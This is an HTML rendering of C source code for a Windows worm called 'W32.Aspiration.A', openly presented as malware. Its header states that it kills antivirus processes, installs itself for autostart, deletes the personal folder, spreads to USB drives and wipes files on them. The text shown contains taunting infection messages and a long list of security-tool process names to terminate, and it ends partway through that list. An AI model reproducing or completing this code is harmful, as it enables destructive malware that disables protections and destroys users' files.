<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Aspiration - W32.Aspiration.A.SRC.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
Payload of W32.Aspiration.A:

- Kills AV processes
- Copies to 4 different locations on PC and writes to Autostart with different ways
- Creates two text files and two HTML files and executes Notepad and IE to show them to the user
- Deletes personal folder
- Copies to USB flash drives (if connected) and deletes the files being saved on them
- ... Some other little things ...

#########################################################################
#########################################################################

    Author: SkyOut

    Compiled with: -&gt; Visual C++ 2005 Express Edition
                   -&gt; Microsoft PSDK for Windows Server 2003 R2

    Finished: 11th July 2006 - 21:30 - GMT +01:00

*/</span><span class="sc0">

</span><span class="sc1">/* Defining Windows Version being WindowsXP (0x0501) */</span><span class="sc0">
</span><span class="sc9">#define _WIN32_WINNT 0x0501
</span><span class="sc0">
</span><span class="sc1">/* All needed header files */</span><span class="sc0">
</span><span class="sc9">#include &lt;windows.h&gt;
#include &lt;tlhelp32.h&gt;
#include &lt;shlobj.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;devguid.h&gt;
#include &lt;regstr.h&gt;
#include &lt;setupapi.h&gt;
#include &lt;tchar.h&gt;
#include &lt;shellapi.h&gt;
</span><span class="sc0">
</span><span class="sc1">/* The first text file (for the user) */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szTextFile1</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">" \
W32.ASPIRATION.A\r\n \
#################################################################\r\n \
-\r\n \
Your computer has been infected by the aspiration virus...\r\n \
-\r\n \
It's up to you to decide what to do, but it's too late, I don't care what you do now...\r\n \
-\r\n \
I have installed myself on the system...\r\n \
-\r\n \
I have destroyed your files and I will go on doing it...\r\n \
-\r\n \
The only sense in my life is to make yours a hell..."</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* The second text file (for the AV guys) */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szTextFile2</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">" \
TO ALL THOSE ANTIVIRUS AND SECURITY COMPANIES\r\n \
---------------------------------------------\r\n \
\r\n \
You can't stop us, you can't fight all of us!\r\n \
We will win, we will stay, we will go on!\r\n \
Give up or die, we will survive, you won't!\r\n \
FUCK YOU AND GOOD BYE!"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* The first html file (for the user) */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szHTMLFile1</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">" \
                  &lt;html&gt;\r\n \
                  &lt;head&gt;&lt;title&gt;- - - W32.Aspiration.A - - -&lt;/title&gt;&lt;/head&gt;\r\n \
                  &lt;body text=\"#00FF00\" bgcolor=\"#000000\"&gt;\r\n \
                  &lt;h1 align=\"center\"&gt;Your computer has been infected by the aspiration virus...&lt;/h1&gt;\r\n \
                  &lt;h1 align=\"center\"&gt;It's up to you to decide what to do, but it's too late, I don't care what you do now...&lt;/h1&gt;\r\n \
                  &lt;h1 align=\"center\"&gt;I have installed myself on the system....&lt;/h1&gt;\r\n \
                  &lt;h1 align=\"center\"&gt;I have destroyed your files and I will go on doing it...&lt;/h1&gt;\r\n \
                  &lt;h1 align=\"center\"&gt;The only sense in my life is to make yours a hell...&lt;/h1&gt;\r\n \
                  &lt;br&gt;\r\n \
                  &lt;br&gt;\r\n \
                  &lt;hr&gt;\r\n \
                  &lt;h1 align=\"center\"&gt;&lt;font color=\"#FF0000\"&gt;W32.ASPIRATION.A&lt;/font&gt;&lt;/h1&gt;\r\n \
                  &lt;/body&gt;\r\n \
                  &lt;/html&gt;\r\n"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* The second html file (for the AV guys)*/</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szHTMLFile2</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">" \
                   &lt;html&gt;\r\n \
                   &lt;head&gt;&lt;title&gt;--- TO THE AV COMPANIES OUT THERE ---&lt;/title&gt;&lt;/head&gt;\r\n \
                   &lt;body text=\"#00FF00\" bgcolor=\"#000000\"&gt;\r\n \
                   &lt;h1 align=\"center\"&gt;THIS PC IS INFECTED&lt;/h1&gt;\r\n \
                   &lt;h1 align=\"center\"&gt;A STORM OF INFECTIONS WILL FOLLOW&lt;/h1&gt;\r\n \
                   &lt;h1 align=\"center\"&gt;FUCK OFF - YOU CAN NOT STOP THIS&lt;/h1&gt;\r\n \
                   &lt;/body&gt;\r\n \
                   &lt;/html&gt;"</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc1">/* Process list of most AV products - Thanks to Hutley/RRLF */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">AVProcessList</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc6">"avp32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avpmon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"zonealarm.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"vshwin32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"vet95.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"tbscan.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"serv95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Nspclean.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"clrav.com"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scan32.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"rav7.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"navw.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"outpost.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nmain.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"navnt.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"mpftray.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lockdown2000.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"icssuppnt.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"icload95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"iamapp.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"findviru.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"f - agnt95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dv95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dv95_o.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"claw95ct.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"cfiaudit.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avwupd32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avptc32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"_avp32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avgctrl.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"apvxdwin.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"_avpcc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avpcc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"wfindv32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"vsecomr.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"tds2 - nt.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sweep95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"EFINET32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scrscan.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"safeweb.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"persfw.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"navsched.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nvc95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nisum.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"navlu32.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"ALOGSERV"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AMON9X"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVGSERV9"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVGW"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avkpop"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"avkservice"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AvkServ"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avkwctl9"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVXMONITOR9X"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVXMONITORNT"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"AVXQUAR"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"moolive.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"jed.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"icsupp95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ibmavsp.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"frw.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"f - stopw.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"espwatch.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"procexp"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"filemon.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"regmon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"dvp95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cfiadmin.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avwin95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avpm.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"avp.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ave32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"anti - trojan.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"webscan.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"webscanx.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"vsscan40.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tds2 - 98. exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SymProxySvc"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SYMTRAY"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TAUMON"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"TCM"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TDS - 3 "</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TFAK"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"vbcmserv"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VbCons"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"VIR - HELP"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VPC32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VPTRAY"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VSMAIN"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"vsmon"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"WIMMUN32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WGFE95"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WEBTRAP"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WATCHDOG"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WrAdmin"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"sphinx.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scanpm.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rescue.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pcfwallicon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pavcl.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"nupgrade.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"navwnt.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"navapw32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"luall.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"iomon98.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"icmoon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fprot.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"f - prot95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"esafe.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cleaner3.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"IBMASN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVXW"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cfgWiz"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CMGRDIAN"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CONNECTIONMONITOR"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"CPDClnt"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"DEFWATCH"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CTRL"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"defalert"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"defscangui"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"DOORS"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"EFPEADM"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ETRUSTCIPE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"EVPN"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"EXPERT"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"fameh32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fch32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fih32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"blackice.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avsched32.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"avpdos32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avpnt.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avconsol.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ackwin32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NWTOOL16"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"pccwin97"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PROGRAMAUDITOR"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"POP3TRAP"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PROCESSMONITOR"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PORTMONITOR"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"POPROXY"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pcscan"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pcntmon"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pavproxy"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"PADMIN"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"pview95"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rapapp.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"REALMON"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"RTVSCN95"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"vsstat.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"vettray.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"tca.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"smc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"scan95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"rav7win.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"pccwin98.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"KPFW32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ADVXDWIN"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"padmin.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"normist.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"navw32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"n32scan.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lookout.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"iface.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"icloadnt.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"SPYXX"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SS3EDIT"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SweepNet"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"iamserv.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fp - win.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"f - prot.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ecengine.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cleaner.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cfind.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"blackd.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"RULAUNCH"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sbserv"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SWNETSUP"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"WrCtrl"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"avpupd.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"avkserv.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"autodown.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"_avpm.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AvpM.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"regedit.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"msconfig.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"FPROT95.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"IBMASN.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"sfc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"regedt32.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"offguard.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pav.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pavmail.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"per.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"perd.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"pertsk.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"perupd.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pervac.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pervacd.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"th.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"th32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"th32upd.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"thav.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"thd.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"thd32.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"thmail.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"alertsvc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"amon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"kpf.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"antivir"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"avsynmgr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cfinet.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"cfinet32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"icmon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"lockdownadvanced.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"lucomserver.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"mcafee"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"navapsvc.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"navrunr.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"nisserv.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"nsched32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pcciomon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pccmain.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pview95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Avnt.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"Claw95cf.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Dvp95_0.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Vscan40.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Icsuppnt.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Jedi.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"N32scanw.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Pavsched.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Pavw.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Avrep32.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Monitor.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"fsgk32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fsm32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fsma32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fsmb32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"gbmenu"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"GBPOLL"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"GENERICS"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"GUARD"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"IAMSTATS"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ISRV95"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"LDPROMENU"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LDSCAN"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"LUSPT"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MCMNHDLR"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MCTOOL"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"MCUPDATE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MCVSRTE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MGHTML"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MINILOG"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MCVSSHLD"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"MCAGENT"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MPFSERVICE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MWATCH"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NeoWatchLog"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NVSVC32"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"NWService"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NTXconfig"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NTVDM"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ntrtscan"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"npssvc"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"npscheck"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"netutils"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ndd32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"NAVENGNAVEX15"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"notstart.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"zapro.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pqremove.com"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"BullGuard"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"CCAPP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"vet98.exe"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"VET32.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"VCONTROL.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"claw95.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ANTS"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ATCON"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"ATUPDATER"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ATWATCH"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AutoTrace"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AVGCC32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"AvgServ"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"AVWINNT"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fnrb32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fsaa"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"fsav32"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ZAP.EXE"</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc6">"ZAPD.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ZAPPRG.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ZAPS.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"ZCAP.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"pfwagent.exe"</span><span class="sc10">,</span><span class="sc0">
